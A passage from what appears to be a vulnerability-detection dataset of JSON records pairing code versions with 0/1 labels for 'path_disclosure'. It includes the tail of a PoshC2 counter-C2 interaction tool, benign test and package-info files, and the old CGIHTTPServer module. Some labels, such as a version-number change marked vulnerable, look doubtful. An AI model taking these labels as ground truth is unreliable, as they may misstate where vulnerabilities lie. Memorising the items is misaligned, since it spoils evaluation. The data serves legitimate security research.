help=\"Fuzz with random bytes\")\n  if len( sys.argv)==1:\n    parser.print_help()\n    sys.exit(1)\n  args = parser.parse_args()\n\n  if args.analyse:\n    payload = PoshC2Payload( args.analyse )   \n    c2 = payload.analyse()\n    secondstage = payload.secondstage\n  else:\n    c2 = PoshC2Server()\n    c2.useragent = args.useragent\n    c2.referer = args.referer\n    c2.key = args.key\n    c2.host = args.host\n  c2.domain = args.domain\n  c2.username = args.user\n  c2.machine = args.machine\n\n  if args.connect:\n    c2.secondstage( secondstage )\n    return True\n\n  if args.watch:\n    c2.secondstage( secondstage, interact=True )\n    return True\n\n  if args.rickroll:\n    c2.rickroll( payload.secondstage )\n    return True\n\n  if args.upload:\n    c2.secondstage( secondstage )\n    c2.uploadfile( args.upload[0], args.upload[1] ) \n\n  if args.fuzz:\n    c2.fuzz( secondstage )\n\nif __name__ == \"__main__\":\n  main()\n/n/n/n", "label": 1, "vtype": "path_disclosure"}, {"id": "656f459e53a177aeabfb96f00e6b8f4a28f87c98", "code": "tests/test_bw2_disclosure.py/n/nimport os\nimport brightway2 as bw2\nfrom fixtures import *\n\nfrom lca_disclosures.brightway2.disclosure import Bw2Disclosure as DisclosureExporter\nfrom lca_disclosures.brightway2.importer import DisclosureImporter\n\ndef test_attributes():\n\n    de = DisclosureExporter(TEST_BW_PROJECT_NAME, TEST_BW_DB_NAME, folder_path=TEST_FOLDER, filename=TEST_FILENAME)\n\n    assert de.foreground_flows\n    assert de.background_flows\n    assert de.emission_flows\n    assert de.Af\n    assert de.Ad\n    assert de.Bf\n    assert de.cutoffs\n\n\ndef test_bw2_disclosure():\n    \n    de = DisclosureExporter(TEST_BW_PROJECT_NAME, TEST_BW_DB_NAME, folder_path=TEST_FOLDER, filename=TEST_FILENAME)\n\n    disclosure_file = de.write_json()\n\n    print (os.path.realpath(disclosure_file))\n\n    assert os.path.isfile(disclosure_file)\n\n    bw2.projects.set_current(IMPORT_PROJECT_NAME)\n\n    di = DisclosureImporter(disclosure_file)\n\n    di.apply_strategies()\n\n    assert di.statistics()[2] == 0\n\n    di.write_database()\n\n    assert len(bw2.Database(di.db_name)) != 0\n/n/n/n", "label": 0, "vtype": "path_disclosure"}, {"id": "656f459e53a177aeabfb96f00e6b8f4a28f87c98", "code": "/tests/test_bw2_disclosure.py/n/nimport os\nimport brightway2 as bw2\nfrom fixtures import *\n\nfrom lca_disclosures.brightway2.disclosure import Bw2Disclosure as DisclosureExporter\nfrom lca_disclosures.brightway2.importer import DisclosureImporter\n\ndef test_attributes():\n\n    de = DisclosureExporter(TEST_BW_PROJECT_NAME, TEST_BW_DB_NAME, folder_path=TEST_FOLDER, filename=TEST_FILENAME)\n\n    assert de.foreground_flows\n    assert de.background_flows\n    assert de.emission_flows\n    assert de.Af\n    assert de.Ad\n    assert de.Bf\n    assert de.cutoffs\n\n\ndef test_bw2_disclosure():\n    \n    de = DisclosureExporter(TEST_BW_PROJECT_NAME, TEST_BW_DB_NAME, folder_path=TEST_FOLDER, filename=TEST_FILENAME)\n\n    disclosure_file = de.write_json()\n\n    print (disclosure_file)\n\n    assert os.path.isfile(disclosure_file)\n\ndef test_bw2_import():\n\n    bw2.projects.set_current(IMPORT_PROJECT_NAME)\n\n    di = DisclosureImporter(os.path.join(os.path.dirname(os.path.realpath(__file__)), TEST_FOLDER, \"{}.json\".format(TEST_FILENAME)))\n\n    di.apply_strategies()\n\n    assert di.statistics()[2] == 0\n\n    di.write_database()\n\n    assert len(bw2.Database(di.db_name)) != 0\n/n/n/n", "label": 1, "vtype": "path_disclosure"}, {"id": "31ab237dacb201a31b16de76ffd7449873cb18d8", "code": "hybrid/package_info.py/n/n# Copyright 2018 D-Wave Systems Inc.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#   http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n__packagename__ = 'dwave-hybrid'\n__title__ = 'D-Wave Hybrid'\n__version__ = '0.2.0'\n__author__ = 'D-Wave Systems Inc.'\n__authoremail__ = 'radomir@dwavesys.com'\n__description__ = 'Hybrid Asynchronous Decomposition Solver Framework'\n__url__ = 'https://github.com/dwavesystems/dwave-hybrid'\n__license__ = 'Apache 2.0'\n__copyright__ = '2018, D-Wave Systems Inc.'\n/n/n/n", "label": 0, "vtype": "path_disclosure"}, {"id": "31ab237dacb201a31b16de76ffd7449873cb18d8", "code": "/hybrid/package_info.py/n/n# Copyright 2018 D-Wave Systems Inc.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#   http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n__packagename__ = 'dwave-hybrid'\n__title__ = 'D-Wave Hybrid'\n__version__ = '0.1.4'\n__author__ = 'D-Wave Systems Inc.'\n__authoremail__ = 'radomir@dwavesys.com'\n__description__ = 'Hybrid Asynchronous Decomposition Solver Framework'\n__url__ = 'https://github.com/dwavesystems/dwave-hybrid'\n__license__ = 'Apache 2.0'\n__copyright__ = '2018, D-Wave Systems Inc.'\n/n/n/n", "label": 1, "vtype": "path_disclosure"}, {"id": "b0214dec06089bd9f45b028f3b69ed5dc29df204", "code": "tests/graph_test.py/n/nimport unittest\nfrom src.graph import *\n\n\ntest_offers = [{\n  'offers': [\n    {'contact_ign': 'KnifeySpooneyClaw', 'conversion_rate': 0.0893, 'stock': 153}\n  ],\n  'want': 'Chaos',\n  'have': 'Alteration',\n  'league': 'Abyss'\n}, {\n  'offers': [\n    {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 10},\n    {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 20}\n  ],\n  'want': 'Chaos',\n  'have': 'Chromatic',\n  'league': 'Abyss'\n}, {\n  'offers': [\n    {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 24},\n    {'contact_ign': 'Corailthedog', 'conversion_rate': 11.0, 'stock': 2}\n  ],\n  'want': 'Alteration',\n  'have': 'Chaos',\n  'league': 'Abyss'\n}, {\n  'offers': [\n    {'contact_ign': 'Azure_Dragon', 'conversion_rate': 1.0101, 'stock': 4261},\n    {'contact_ign': 'Marcvz_GreenAgain', 'conversion_rate': 0.7143, 'stock': 222}\n  ],\n    'want': 'Alteration',\n    'have': 'Chromatic',\n    'league': 'Abyss'\n}, {\n  'offers': [\n    {'contact_ign': 'The_Dank_Fire_God', 'conversion_rate': 11.5, 'stock': 106},\n    {'contact_ign': 'MinerinoAbysss', 'conversion_rate': 11.1, 'stock': 322}\n  ],\n  'want': 'Chromatic',\n  'have': 'Chaos',\n  'league': 'Abyss'\n}, {\n  'offers': [\n    {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449},\n    {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576}\n  ],\n  'want': 'Chromatic',\n  'have': 'Alteration',\n  'league': 'Abyss'\n}]\n\nexpected_graph = {\n  'Chaos': {\n    'Alteration': [\n      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 24},\n      {'contact_ign': 'Corailthedog', 'conversion_rate': 11.0, 'stock': 2}\n    ],\n    'Chromatic': [\n      {'contact_ign': 'The_Dank_Fire_God', 'conversion_rate': 11.5, 'stock': 106},\n      {'contact_ign': 'MinerinoAbysss', 'conversion_rate': 11.1, 'stock': 322}\n    ]\n  },\n  'Alteration': {\n    'Chaos': [\n      {'contact_ign': 'KnifeySpooneyClaw', 'conversion_rate': 0.0893, 'stock': 153}\n    ],\n    'Chromatic': [\n      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449},\n      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576}\n    ]\n  },\n  'Chromatic': {\n    'Chaos': [\n      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 10},\n      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 20}\n    ],\n    'Alteration': [\n      {'contact_ign': 'Azure_Dragon', 'conversion_rate': 1.0101, 'stock': 4261},\n      {'contact_ign': 'Marcvz_GreenAgain', 'conversion_rate': 0.7143, 'stock': 222}\n    ]\n  }\n}\n\n\n\n### Below structures are modified for simpler testing => number reduced, offers slightly changed\n\n\n# Exptected graph when trading from Chaos to Chaos over one other currency\nexpected_graph_small = {\n  'Chaos': {\n    'Alteration': [\n      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100}\n    ]\n  },\n  'Alteration': {\n    'Chromatic': [\n      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449},\n      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576}\n    ]\n  },\n  'Chromatic': {\n    'Chaos': [\n      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 100},\n      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 200}\n    ]\n  }\n}\n\n# Expected paths from Chaos to Chaos\ndef expected_paths_small_same_currency():\n  return [\n    [\n      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},\n      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576, 'have': 'Alteration', 'want': 'Chromatic'},\n      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 200, 'have': 'Chromatic', 'want': 'Chaos'}\n    ], [\n      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},\n      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576, 'have': 'Alteration', 'want': 'Chromatic'},\n      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 100, 'have': 'Chromatic', 'want': 'Chaos'}\n    ], [\n      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},\n      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449, 'have': 'Alteration', 'want': 'Chromatic'},\n      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 200, 'have': 'Chromatic', 'want': 'Chaos'}\n    ], [\n      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},\n      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449, 'have': 'Alteration', 'want': 'Chromatic'},\n      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 100, 'have': 'Chromatic', 'want': 'Chaos'}\n    ]\n  ]\n\ndef expected_profitable_paths_small_same_currency():\n  return []\n\n\n# Expected paths from Chaos to Chromatics\n# This is not really relevant to us, since we only care about trade paths between the same currency in order to\n# guarantee easily comparable results. However, it's good to make sure that the path exploration also works for this\n# edge case\nexpected_profitable_paths_small_different_currency = [\n  [\n    {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},\n    {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576, 'have': 'Alteration', 'want': 'Chromatic'}\n  ], [\n    {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},\n    {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449, 'have': 'Alteration', 'want': 'Chromatic'}\n  ]\n]\n\n\nexpected_conversion = {\n  \"from\": \"Chaos\",\n  \"to\": \"Chaos\",\n  \"starting\": 8,\n  \"ending\": 5,\n  \"winnings\": -3,\n  \"transactions\": [{\n    \"contact_ign\": \"wreddnuy\",\n    \"from\": \"Chaos\",\n    \"to\": \"Alteration\",\n    \"paid\": 8,\n    \"received\": 96,\n    \"conversion_rate\": 12.0\n  }, {\n    \"contact_ign\": \"Shioua_ouah\",\n    \"from\": \"Alteration\",\n    \"to\": \"Chromatic\",\n    \"paid\": 96,\n    \"received\": 66,\n    \"conversion_rate\": 0.6897\n  }, {\n    \"contact_ign\": \"MVP_Kefir\",\n    \"from\": \"Chromatic\",\n    \"to\": \"Chaos\",\n    \"paid\": 66,\n    \"received\": 5,\n    \"conversion_rate\": 0.087\n  }]\n}\n\n\nclass GraphTest(unittest.TestCase):\n  def test_build_graph(self):\n    graph = build_graph(test_offers)\n    self.assertDictEqual(graph, expected_graph)\n\n  def test_find_paths(self):\n    paths_small_same_currency = find_paths(expected_graph_small, 'Chaos', 'Chaos')\n    self.assertListEqual(expected_profitable_paths_small_same_currency(), paths_small_same_currency)\n    paths_small_different_currency = find_paths(expected_graph_small.copy(), 'Chaos', 'Chromatic')\n    self.assertListEqual(expected_profitable_paths_small_different_currency, paths_small_different_currency)\n\n  def test_is_profitable(self):\n    path = expected_paths_small_same_currency()[0]\n    self.assertEqual(False, is_profitable(path))\n\n  def test_build_conversions(self):\n    path = expected_paths_small_same_currency()[0]\n    conversion = build_conversion(path)\n    print(conversion)\n    self.assertDictEqual(expected_conversion, conversion)\n\n  def test_stock_equalization(self):\n    pass\n/n/n/n", "label": 0, "vtype": "path_disclosure"}, {"id": "b0214dec06089bd9f45b028f3b69ed5dc29df204", "code": "/tests/graph_test.py/n/nimport unittest\nfrom src.graph import *\n\n\ntest_offers = [{\n  'offers': [\n    {'contact_ign': 'KnifeySpooneyClaw', 'conversion_rate': 0.0893, 'stock': 153}\n  ],\n  'want': 'Chaos',\n  'have': 'Alteration',\n  'league': 'Abyss'\n}, {\n  'offers': [\n    {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 10},\n    {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 20}\n  ],\n  'want': 'Chaos',\n  'have': 'Chromatic',\n  'league': 'Abyss'\n}, {\n  'offers': [\n    {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 24},\n    {'contact_ign': 'Corailthedog', 'conversion_rate': 11.0, 'stock': 2}\n  ],\n  'want': 'Alteration',\n  'have': 'Chaos',\n  'league': 'Abyss'\n}, {\n  'offers': [\n    {'contact_ign': 'Azure_Dragon', 'conversion_rate': 1.0101, 'stock': 4261},\n    {'contact_ign': 'Marcvz_GreenAgain', 'conversion_rate': 0.7143, 'stock': 222}\n  ],\n    'want': 'Alteration',\n    'have': 'Chromatic',\n    'league': 'Abyss'\n}, {\n  'offers': [\n    {'contact_ign': 'The_Dank_Fire_God', 'conversion_rate': 11.5, 'stock': 106},\n    {'contact_ign': 'MinerinoAbysss', 'conversion_rate': 11.1, 'stock': 322}\n  ],\n  'want': 'Chromatic',\n  'have': 'Chaos',\n  'league': 'Abyss'\n}, {\n  'offers': [\n    {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449},\n    {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576}\n  ],\n  'want': 'Chromatic',\n  'have': 'Alteration',\n  'league': 'Abyss'\n}]\n\nexpected_graph = {\n  'Chaos': {\n    'Alteration': [\n      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 24},\n      {'contact_ign': 'Corailthedog', 'conversion_rate': 11.0, 'stock': 2}\n    ],\n    'Chromatic': [\n      {'contact_ign': 'The_Dank_Fire_God', 'conversion_rate': 11.5, 'stock': 106},\n      {'contact_ign': 'MinerinoAbysss', 'conversion_rate': 11.1, 'stock': 322}\n    ]\n  },\n  'Alteration': {\n    'Chaos': [\n      {'contact_ign': 'KnifeySpooneyClaw', 'conversion_rate': 0.0893, 'stock': 153}\n    ],\n    'Chromatic': [\n      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449},\n      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576}\n    ]\n  },\n  'Chromatic': {\n    'Chaos': [\n      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 10},\n      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 20}\n    ],\n    'Alteration': [\n      {'contact_ign': 'Azure_Dragon', 'conversion_rate': 1.0101, 'stock': 4261},\n      {'contact_ign': 'Marcvz_GreenAgain', 'conversion_rate': 0.7143, 'stock': 222}\n    ]\n  }\n}\n\n\n\n### Below structures are modified for simpler testing => number reduced, offers slightly changed\n\n\n# Exptected graph when trading from Chaos to Chaos over one other currency\nexpected_graph_small = {\n  'Chaos': {\n    'Alteration': [\n      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100}\n    ]\n  },\n  'Alteration': {\n    'Chromatic': [\n      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449},\n      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576}\n    ]\n  },\n  'Chromatic': {\n    'Chaos': [\n      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 100},\n      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 200}\n    ]\n  }\n}\n\n# Expected paths from Chaos to Chaos\ndef expected_paths_small_same_currency():\n  return [\n    [\n      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},\n      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576, 'have': 'Alteration', 'want': 'Chromatic'},\n      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 200, 'have': 'Chromatic', 'want': 'Chaos'}\n    ], [\n      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},\n      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576, 'have': 'Alteration', 'want': 'Chromatic'},\n      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 100, 'have': 'Chromatic', 'want': 'Chaos'}\n    ], [\n      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},\n      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449, 'have': 'Alteration', 'want': 'Chromatic'},\n      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 200, 'have': 'Chromatic', 'want': 'Chaos'}\n    ], [\n      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},\n      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449, 'have': 'Alteration', 'want': 'Chromatic'},\n      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 100, 'have': 'Chromatic', 'want': 'Chaos'}\n    ]\n  ]\n\n\n# Expected paths from Chaos to Chromatics\n# This is not really relevant to us, since we only care about trade paths between the same currency in order to\n# guarantee easily comparable results. However, it's good to make sure that the path exploration also works for this\n# edge case\nexpected_paths_small_different_currency = [\n  [\n    {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},\n    {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576, 'have': 'Alteration', 'want': 'Chromatic'}\n  ], [\n    {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},\n    {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449, 'have': 'Alteration', 'want': 'Chromatic'}\n  ]\n]\n\n\nexpected_conversion = {\n  \"from\": \"Chaos\",\n  \"to\": \"Chaos\",\n  \"starting\": 8,\n  \"ending\": 5,\n  \"winnings\": -3,\n  \"transactions\": [{\n    \"contact_ign\": \"wreddnuy\",\n    \"from\": \"Chaos\",\n    \"to\": \"Alteration\",\n    \"paid\": 8,\n    \"received\": 96\n  }, {\n    \"contact_ign\": \"Shioua_ouah\",\n    \"from\": \"Alteration\",\n    \"to\": \"Chromatic\",\n    \"paid\": 96,\n    \"received\": 66\n  }, {\n    \"contact_ign\": \"MVP_Kefir\",\n    \"from\": \"Chromatic\",\n    \"to\": \"Chaos\",\n    \"paid\": 66,\n    \"received\": 5\n  }]\n}\n\n\nclass GraphTest(unittest.TestCase):\n  def test_build_graph(self):\n    graph = build_graph(test_offers)\n    self.assertDictEqual(graph, expected_graph)\n\n  def test_find_paths(self):\n    paths_small_same_currency = find_paths(expected_graph_small, 'Chaos', 'Chaos')\n    self.assertListEqual(expected_paths_small_same_currency(), paths_small_same_currency)\n    paths_small_different_currency = find_paths(expected_graph_small.copy(), 'Chaos', 'Chromatic')\n    self.assertListEqual(expected_paths_small_different_currency, paths_small_different_currency)\n\n  def test_is_profitable(self):\n    path = expected_paths_small_same_currency()[0]\n    self.assertEqual(False, is_profitable(path))\n\n  def test_build_conversions(self):\n    path = expected_paths_small_same_currency()[0]\n    conversion = build_conversion(path)\n    print(conversion)\n    self.assertDictEqual(expected_conversion, conversion)\n/n/n/n", "label": 1, "vtype": "path_disclosure"}, {"id": "923ba361d8f757f0656cfd216525aca4848e02aa", "code": "Lib/CGIHTTPServer.py/n/n\"\"\"CGI-savvy HTTP Server.\n\nThis module builds on SimpleHTTPServer by implementing GET and POST\nrequests to cgi-bin scripts.\n\nIf the os.fork() function is not present (e.g. on Windows),\nos.popen2() is used as a fallback, with slightly altered semantics; if\nthat function is not present either (e.g. on Macintosh), only Python\nscripts are supported, and they are executed by the current process.\n\nIn all cases, the implementation is intentionally naive -- all\nrequests are executed sychronously.\n\nSECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL\n-- it may execute arbitrary Python code or external programs.\n\nNote that status code 200 is sent prior to execution of a CGI script, so\nscripts cannot send other status codes such as 302 (redirect).\n\"\"\"\n\n\n__version__ = \"0.4\"\n\n__all__ = [\"CGIHTTPRequestHandler\"]\n\nimport os\nimport sys\nimport urllib\nimport BaseHTTPServer\nimport SimpleHTTPServer\nimport select\n\n\nclass CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):\n\n    \"\"\"Complete HTTP server with GET, HEAD and POST commands.\n\n    GET and HEAD also support running CGI scripts.\n\n    The POST command is *only* implemented for CGI scripts.\n\n    \"\"\"\n\n    # Determine platform specifics\n    have_fork = hasattr(os, 'fork')\n    have_popen2 = hasattr(os, 'popen2')\n    have_popen3 = hasattr(os, 'popen3')\n\n    # Make rfile unbuffered -- we need to read one line and then pass\n    # the rest to a subprocess, so we can't use buffered input.\n    rbufsize = 0\n\n    def do_POST(self):\n        \"\"\"Serve a POST request.\n\n        This is only implemented for CGI scripts.\n\n        \"\"\"\n\n        if self.is_cgi():\n            self.run_cgi()\n        else:\n            self.send_error(501, \"Can only POST to CGI scripts\")\n\n    def send_head(self):\n        \"\"\"Version of send_head that support CGI scripts\"\"\"\n        if self.is_cgi():\n            return self.run_cgi()\n        else:\n            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)\n\n    def is_cgi(self):\n        \"\"\"Test whether self.path corresponds to a CGI script.\n\n        Returns True and updates the cgi_info attribute to the tuple\n        (dir, rest) if self.path requires running a CGI script.\n        Returns False otherwise.\n\n        The default implementation tests whether the normalized url\n        path begins with one of the strings in self.cgi_directories\n        (and the next character is a '/' or the end of the string).\n        \"\"\"\n        splitpath = _url_collapse_path_split(self.path)\n        if splitpath[0] in self.cgi_directories:\n            self.cgi_info = splitpath\n            return True\n        return False\n\n    cgi_directories = ['/cgi-bin', '/htbin']\n\n    def is_executable(self, path):\n        \"\"\"Test whether argument path is an executable file.\"\"\"\n        return executable(path)\n\n    def is_python(self, path):\n        \"\"\"Test whether argument path is a Python script.\"\"\"\n        head, tail = os.path.splitext(path)\n        return tail.lower() in (\".py\", \".pyw\")\n\n    def run_cgi(self):\n        \"\"\"Execute a CGI script.\"\"\"\n        path = self.path\n        dir, rest = self.cgi_info\n\n        i = path.find('/', len(dir) + 1)\n        while i >= 0:\n            nextdir = path[:i]\n            nextrest = path[i+1:]\n\n            scriptdir = self.translate_path(nextdir)\n            if os.path.isdir(scriptdir):\n                dir, rest = nextdir, nextrest\n                i = path.find('/', len(dir) + 1)\n            else:\n                break\n\n        # find an explicit query string, if present.\n        i = rest.rfind('?')\n        if i >= 0:\n            rest, query = rest[:i], rest[i+1:]\n        else:\n            query = ''\n\n        # dissect the part after the directory name into a script name &\n        # a possible additional path, to be stored in PATH_INFO.\n        i = rest.find('/')\n        if i >= 0:\n            script, rest = rest[:i], rest[i:]\n        else:\n            script, rest = rest, ''\n\n        scriptname = dir + '/' + script\n        scriptfile = self.translate_path(scriptname)\n        if not os.path.exists(scriptfile):\n            self.send_error(404, \"No such CGI script (%r)\" % scriptname)\n            return\n        if not os.path.isfile(scriptfile):\n            self.send_error(403, \"CGI script is not a plain file (%r)\" %\n                            scriptname)\n            return\n        ispy = self.is_python(scriptname)\n        if not ispy:\n            if not (self.have_fork or self.have_popen2 or self.have_popen3):\n                self.send_error(403, \"CGI script is not a Python script (%r)\" %\n                                scriptname)\n                return\n            if not self.is_executable(scriptfile):\n                self.send_error(403, \"CGI script is not executable (%r)\" %\n                                scriptname)\n                return\n\n        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html\n        # XXX Much of the following could be prepared ahead of time!\n        env = {}\n        env['SERVER_SOFTWARE'] = self.version_string()\n        env['SERVER_NAME'] = self.server.server_name\n        env['GATEWAY_INTERFACE'] = 'CGI/1.1'\n        env['SERVER_PROTOCOL'] = self.protocol_version\n        env['SERVER_PORT'] = str(self.server.server_port)\n        env['REQUEST_METHOD'] = self.command\n        uqrest = urllib.unquote(rest)\n        env['PATH_INFO'] = uqrest\n        env['PATH_TRANSLATED'] = self.translate_path(uqrest)\n        env['SCRIPT_NAME'] = scriptname\n        if query:\n            env['QUERY_STRING'] = query\n        host = self.address_string()\n        if host != self.client_address[0]:\n            env['REMOTE_HOST'] = host\n        env['REMOTE_ADDR'] = self.client_address[0]\n        authorization = self.headers.getheader(\"authorization\")\n        if authorization:\n            authorization = authorization.split()\n            if len(authorization) == 2:\n                import base64, binascii\n                env['AUTH_TYPE'] = authorization[0]\n                if authorization[0].lower() == \"basic\":\n                    try:\n                        authorization = base64.decodestring(authorization[1])\n                    except binascii.Error:\n                        pass\n                    else:\n                        authorization = authorization.split(':')\n                        if len(authorization) == 2:\n                            env['REMOTE_USER'] = authorization[0]\n        # XXX REMOTE_IDENT\n        if self.headers.typeheader is None:\n            env['CONTENT_TYPE'] = self.headers.type\n        else:\n            env['CONTENT_TYPE'] = self.headers.typeheader\n        length = self.headers.getheader('content-length')\n        if length:\n            env['CONTENT_LENGTH'] = length\n        referer = self.headers.getheader('referer')\n        if referer:\n            env['HTTP_REFERER'] = referer\n        accept = []\n        for line in self.headers.getallmatchingheaders('accept'):\n            if line[:1] in \"\\t\\n\\r \":\n                accept.append(line.strip())\n            else:\n                accept = accept + line[7:].split(',')\n        env['HTTP_ACCEPT'] = ','.join(accept)\n        ua = self.headers.getheader('user-agent')\n        if ua:\n            env['HTTP_USER_AGENT'] = ua\n        co = filter(None, self.headers.getheaders('cookie'))\n        if co:\n            env['HTTP_COOKIE'] = ', '.join(co)\n        # XXX Other HTTP_* headers\n        # Since we're setting the env in the parent, provide empty\n        # values to override previously set values\n        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',\n                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):\n            env.setdefault(k, \"\")\n        os.environ.update(env)\n\n        self.send_response(200, \"Script output follows\")\n\n        decoded_query = query.replace('+', ' ')\n\n        if self.have_fork:\n            # Unix -- fork as we should\n            args = [script]\n            if '=' not in decoded_query:\n                args.append(decoded_query)\n            nobody = nobody_uid()\n            self.wfile.flush() # Always flush before forking\n            pid = os.fork()\n            if pid != 0:\n                # Parent\n                pid, sts = os.waitpid(pid, 0)\n                # throw away additional data [see bug #427345]\n                while select.select([self.rfile], [], [], 0)[0]:\n                    if not self.rfile.read(1):\n                        break\n                if sts:\n                    self.log_error(\"CGI script exit status %#x\", sts)\n                return\n            # Child\n            try:\n                try:\n                    os.setuid(nobody)\n                except os.error:\n                    pass\n                os.dup2(self.rfile.fileno(), 0)\n                os.dup2(self.wfile.fileno(), 1)\n                os.execve(scriptfile, args, os.environ)\n            except:\n                self.server.handle_error(self.request, self.client_address)\n                os._exit(127)\n\n        elif self.have_popen2 or self.have_popen3:\n            # Windows -- use popen2 or popen3 to create a subprocess\n            import shutil\n            if self.have_popen3:\n                popenx = os.popen3\n            else:\n                popenx = os.popen2\n            cmdline = scriptfile\n            if self.is_python(scriptfile):\n                interp = sys.executable\n                if interp.lower().endswith(\"w.exe\"):\n                    # On Windows, use python.exe, not pythonw.exe\n                    interp = interp[:-5] + interp[-4:]\n                cmdline = \"%s -u %s\" % (interp, cmdline)\n            if '=' not in query and '\"' not in query:\n                cmdline = '%s \"%s\"' % (cmdline, query)\n            self.log_message(\"command: %s\", cmdline)\n            try:\n                nbytes = int(length)\n            except (TypeError, 